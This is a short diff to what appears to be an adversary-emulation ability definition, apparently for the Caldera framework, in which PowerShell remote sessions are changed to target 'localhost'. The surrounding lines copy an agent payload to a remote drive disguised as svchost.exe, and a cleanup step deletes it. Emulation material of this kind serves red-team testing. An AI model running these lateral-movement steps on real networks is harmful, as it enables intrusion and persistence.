@@ -12,7 +12,7 @@
       psh:
         command: |
           $drive = "#{remote.host.ip}".replace(".","_");
-          $session = New-PSSession -Name $drive;
+          $session = New-PSSession -ComputerName "localhost" -Name $drive;
           Invoke-Command -Session $session -ScriptBlock {
           $drive = "#{remote.host.ip}".replace(".","_");
           $username = "#{domain.user.name}";
@@ -28,7 +28,7 @@
         payload: sandcat.go-windows
         cleanup: |
           $drive = "#{remote.host.ip}".replace(".","_");
-          $session = Connect-PSSession -ComputerName "$env:COMPUTERNAME" -Name $drive;
+          $session = Connect-PSSession -ComputerName "localhost" -Name $drive;
           Invoke-Command -Session $session -ScriptBlock{$drive = "#{remote.host.ip}".replace(".","_"); Remove-Item -Path $drive":\Users\Public\svchost.exe" -Force; Remove-PSDrive -Name $drive};
           Remove-PSSession -Session $session;
       cmd:
